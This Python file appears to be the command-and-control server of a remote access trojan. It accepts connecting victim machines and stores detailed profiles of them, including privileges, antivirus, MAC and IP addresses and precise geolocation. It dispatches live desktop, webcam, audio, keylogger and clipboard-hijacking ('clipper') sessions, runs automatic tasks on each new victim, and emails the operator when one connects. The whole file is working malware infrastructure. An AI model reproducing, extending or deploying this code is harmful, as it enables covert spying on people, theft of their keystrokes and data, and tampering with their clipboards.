'''
    A vital class taking care of setting
    up the threads, servers & organizing
    connecting clients.

    Verified: 2021 February 8
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * eel
'''

from server.helper import ServerHelper, SafeIP
from server.state import ServerStatic, Dynamic
from server.modules.desktop import Desktop
from server.modules.webcam import Webcam
from server.modules.logger import Logger
from server.controller import Controller
from server.blacklist import Blacklist
from server.modules.audio import Audio
from server.autotask import Autotask
from server.database import Database
from server.settings import Settings
from server.error import ServerError
from server.console import Console
from server.request import Request
from shared.helper import Helper
from shared.state import Static
from server.parse import Parse
from server.email import Email
from shared.data import Data

import traceback
import ipaddress
import socket
import time

if not ServerStatic.TERMINAL:
    from server.web import Gui

    import eel


class ClientType:

    def __init__(self, socket, data):
        self.__socket = socket
        self.__data = data
        self.__connect_ip = SafeIP(data['connect_ip'])

    @property
    def socket(self):
        return self.__socket

    @property
    def data(self):
        return self.__data

    @property
    def connect_ip(self):
        return self.__connect_ip

    @property
    def country(self):
        return self.__data['country']

    @property
    def username(self):
        return self.__data['username']

    @property
    def hostname(self):
        return self.__data['hostname']

    @property
    def privileges(self):
        return self.__data['privileges']

    @property
    def antivirus(self):
        return self.__data['antivirus']

    @property
    def operating_system(self):
        return self.__data['operating_system']

    @property
    def cpu(self):
        return self.__data['cpu']

    @property
    def gpu(self):
        return self.__data['gpu']

    @property
    def ram(self):
        return self.__data['ram']

    @property
    def initial_connect(self):
        return self.__data['initial_connect']

    @property
    def filepath(self):
        return self.__data['filepath']

    @property
    def running(self):
        return self.__data['running']

    @property
    def build_name(self):
        return self.__data['build_name']

    @property
    def build_version(self):
        return self.__data['build_version']

    @property
    def os_version(self):
        return self.__data['os_version']

    @property
    def system_locale(self):
        return self.__data['system_locale']

    @property
    def system_uptime(self):
        return self.__data['system_uptime']

    @property
    def pc_manufacturer(self):
        return self.__data['pc_manufacturer']

    @property
    def pc_model(self):
        return self.__data['pc_model']

    @property
    def mac_address(self):
        return self.__data['mac_address']

    @property
    def external_ip(self):
        return self.__data['external_ip']

    @property
    def local_ip(self):
        return self.__data['local_ip']

    @property
    def timezone(self):
        return self.__data['timezone']

    @property
    def country_code(self):
        return self.__data['country_code']

    @property
    def region(self):
        return self.__data['region']

    @property
    def city(self):
        return self.__data['city']

    @property
    def zip_code(self):
        return self.__data['zip_code']

    @property
    def latitude(self):
        return self.__data['latitude']

    @property
    def longitude(self):
        return self.__data['longitude']


class ServerSocket:

    __TABLE_NAME = 'clients'
    __TABLE_KWARGS = {
        'country': 'text',
        'connect_ip': 'text',
        'username': 'text',
        'hostname': 'text',
        'privileges': 'text',
        'antivirus': 'text',
        'operating_system': 'text',
        'cpu': 'text',
        'gpu': 'text',
        'ram': 'text',
        'initial_connect': 'text',
        'filepath': 'text',
        'running': 'text',
        'build_name': 'text',
        'build_version': 'text',
        'os_version': 'text',
        'system_locale': 'text',
        'system_uptime': 'text',
        'pc_manufacturer': 'text',
        'pc_model': 'text',
        'mac_address': 'text',
        'external_ip': 'text',
        'local_ip': 'text',
        'timezone': 'text',
        'country_code': 'text',
        'region': 'text',
        'city': 'text',
        'zip_code': 'text',
        'latitude': 'text',
        'longitude': 'text'
    }
    __HANDSHAKE_KEYS = {
        'country',
        'username',
        'hostname',
        'privileges',
        'antivirus',
        'operating_system',
        'cpu',
        'gpu',
        'ram',
        'filepath',
        'running',
        'build_name',
        'build_version',
        'os_version',
        'system_locale',
        'system_uptime',
        'pc_manufacturer',
        'pc_model',
        'mac_address',
        'external_ip',
        'local_ip',
        'timezone',
        'country_code',
        'region',
        'city',
        'zip_code',
        'latitude',
        'longitude'
    }

    def threads(self):
        Console.log(f'Started {ServerStatic.NAME}\n',
                    log_type=ServerStatic.ACTION)

        Helper.thread(self.__listen)
        Helper.thread(self.__messages)

        if not ServerStatic.TERMINAL:
            Helper.thread(Gui.start)

    @ServerError.thread
    def __listen(self):
        with socket.socket((socket.AF_INET6
                            if ipaddress.ip_address(Static.IP).version == 6
                            else socket.AF_INET), socket.SOCK_STREAM) as sock:
            sock.bind((Static.IP, Static.PORT))
            sock.listen()

            while True:
                conn, (connect_ip, _) = sock.accept()

                if connect_ip in Blacklist(False).blacklist:
                    Console.log('Blocked Blacklisted IP [{}]\n'.format(
                        connect_ip), Static.WARNING, ServerStatic.ACTION)
                    conn.close()
                    continue

                try:
                    conn.settimeout(Static.LIVE_TIMEOUT)
                    token = Data.recv(conn, True)

                    if token is None:
                        conn.settimeout(Static.TIMEOUT)
                        self.__client(conn, connect_ip, self.__client_id())
                    else:
                        timer, conn_type, args = Dynamic.TOKENS[token]
                        timer.cancel()
                        del Dynamic.TOKENS[token]

                        Data.send(conn)

                        if conn_type == ServerStatic.DESKTOP:
                            Desktop(conn, token, connect_ip).live(*args)
                        elif conn_type == ServerStatic.WEBCAM:
                            Webcam(conn, token, connect_ip).live(*args)
                        elif conn_type == ServerStatic.AUDIO:
                            Audio(conn, token, connect_ip).live(*args)
                        elif conn_type == ServerStatic.KEYLOGGER:
                            Logger('keylogger', conn,
                                   token, connect_ip).live(*args)
                        else:
                            Logger('clipper', conn,
                                   token, connect_ip).live(*args)
                except Exception:
                    Console.log('Connection Handshake Error [{}]\n'.format(
                        connect_ip), Static.WARNING, ServerStatic.ACTION)
                    conn.close()
                    continue

    def __client_id(self):
        while True:
            shortuuid = ServerHelper.uuid()[
                :ServerStatic.UUID_LENGTH]

            if shortuuid not in Dynamic.CLIENTS:
                return shortuuid

    def __client(self, conn, connect_ip, unique_id):
        try:
            try:
                db = Database()
                db.create_table(ServerSocket.__TABLE_NAME,
                                **ServerSocket.__TABLE_KWARGS)
                client_data = db.read(
                    ServerSocket.__TABLE_NAME, fetch=1,
                    condition=('connect_ip', '=', connect_ip))
                db.commit()
                db.close()
            except Exception:
                client_data = []

            Data.send(conn, (not client_data or Settings.CONNECT_REFRESH,
                             bool(Settings.CONNECT_STICKY)))
            response = Data.recv(conn, True)

            self.__verify_connect_handshake(
                response, not client_data or Settings.CONNECT_REFRESH)

            if client_data and not Settings.CONNECT_REFRESH:
                response = dict(zip(
                    ServerSocket.__TABLE_KWARGS, client_data[0]))
        except Exception:
            Console.log('Invalid Connect Handshake\n',
                        Static.DANGER, ServerStatic.ACTION)
            Console.log(traceback.format_exc(),
                        log_type=ServerStatic.TRACEBACK)
            conn.close()
        else:
            if not client_data or (client_data
                                   and Settings.CONNECT_REFRESH):
                response.update(dict(initial_connect=Helper.timestamp(),
                                     connect_ip=connect_ip))

                if not client_data:
                    self.__store_client(response)
                else:
                    self.__store_client(response, True)

            client = ClientType(conn, response)
            Dynamic.CLIENTS[unique_id] = client

            Helper.thread(self.__connect_work, unique_id, client)

    def __verify_connect_handshake(self, response, extensive):
        assert type(response) is dict, \
            'Invalid Connect Handshake Data Type'

        if extensive:
            assert ServerSocket.__HANDSHAKE_KEYS == response.keys(), \
                'Invalid Connect Handshake Keys Data Type'

            for value in response.values():
                assert type(value) is str, \
                    'Invalid Connect Handshake Value Data Type'
        else:
            assert response == Data.message(), 'Invalid Connect Handshake'

    @ServerError.quiet
    def __store_client(self, response, update=False):
        db = Database()

        if update:
            db.update(ServerSocket.__TABLE_NAME, (
                'connect_ip', '=', response['connect_ip']),
                **dict([(category, response[category]) for
                       category in ServerSocket.__TABLE_KWARGS]))
        else:
            db.write(ServerSocket.__TABLE_NAME, [
                     response[category] for category
                     in ServerSocket.__TABLE_KWARGS])
        db.commit()
        db.close()

    @ServerError.quiet
    def __connect_work(self, unique_id, client):
        Console.log('Connected Client [{} {} {}]\n'.format(
            client.connect_ip.pure, ServerStatic.SEPERATOR,
            unique_id), Static.SUCCESS, ServerStatic.ACTION)

        self.__terminal_alert(unique_id, client)
        self.__gui_alert(unique_id, client)
        self.__autotask(unique_id)

        if Settings.EMAIL_ALERT:
            success = Email(
                Settings.EMAIL_SENDER,
                Settings.EMAIL_PASSWORD,
                Settings.EMAIL_RECEIVERS
            ).send(
                f'New Client Connected ({unique_id})',
                'Connection Notification',
                ''.join([
                    '<b>{}: {}</b><br />'.format(
                        display_name, client.data[data_key])
                    for display_name, data_key
                    in ServerStatic.CATEGORIES]))

            if success:
                Console.log('Connect Email Sent [{} {} {}]\n'.format(
                    client.connect_ip.pure, ServerStatic.SEPERATOR,
                    unique_id), log_type=ServerStatic.ACTION)
            else:
                Console.log('Connect Email Failed To Send [{} {} {}]\n'.format(
                    client.connect_ip.pure, ServerStatic.SEPERATOR,
                    unique_id), Static.WARNING, ServerStatic.ACTION)

    @ServerError.quiet
    def __terminal_alert(self, unique_id, client):
        if Settings.TERMINAL_ALERT:
            Console.printf('Client Connected [{} {} {}]'.format(
                client.connect_ip.pure, ServerStatic.SEPERATOR,
                unique_id), Static.INFO, newline=True)

    @ServerError.quiet
    def __gui_alert(self, unique_id, client):
        if not ServerStatic.TERMINAL:
            if eel._websockets != []:
                eel.clientAddEel(unique_id, client.data,
                                 Settings.GUI_ALERT)

    @ServerError.quiet
    def __autotask(self, unique_id):
        db = Database()
        db.execute('CREATE TABLE IF NOT EXISTS {} ({})'.format(
            Autotask.TABLE_NAME, Database.parse(Autotask.TABLE_KWARGS)))
        db.commit()
        db.close()

        for request_type, in Autotask(False).autotask:
            result = Parse.parse_string(Parse.parse_alias(request_type))
            lower = Data.lower(result, False)

            if lower in ServerStatic.SESSION:
                Parse.execute(lower, result, False, ([unique_id], True))
            else:
                Controller.message(False, result, custom=([unique_id], True))

    @ServerError.thread
    def __messages(self):
        if ServerStatic.TERMINAL:
            Static.INTERVAL = Static.ALIVE

        timer = time.time()

        while True:
            if time.time() - timer > ServerStatic.PING_INTERVAL:
                if not ServerStatic.TERMINAL:
                    if (Settings.GUI_UPDATE
                            and eel._websockets != []):
                        interval = Static.INTERVAL
                    else:
                        interval = Static.ALIVE
                else:
                    interval = Static.ALIVE

                Controller.message(False, Data.message(interval),
                                   custom=(Dynamic.CLIENTS, False))
                timer = time.time()

            if Dynamic.MESSAGES:
                for message in Dynamic.MESSAGES:
                    try:
                        if message[0]:
                            Dynamic.RESULT = Request(
                                *message[1], **message[2]).send()
                        else:
                            Request(*message[1], **message[2]).send()
                    except Exception as error:
                        Console.log('[REQUEST] Internal Server Error\n',
                                    Static.DANGER, ServerStatic.ACTION)
                        Console.log(traceback.format_exc(),
                                    log_type=ServerStatic.TRACEBACK)
                        Console.printf(Helper.join(
                            '[REQUEST] Internal Server Error',
                            f'{type(error).__name__}: {error}'
                        ), Static.DANGER, newline=True)
                    finally:
                        Dynamic.MESSAGES.remove(message)
            else:
                time.sleep(.1)
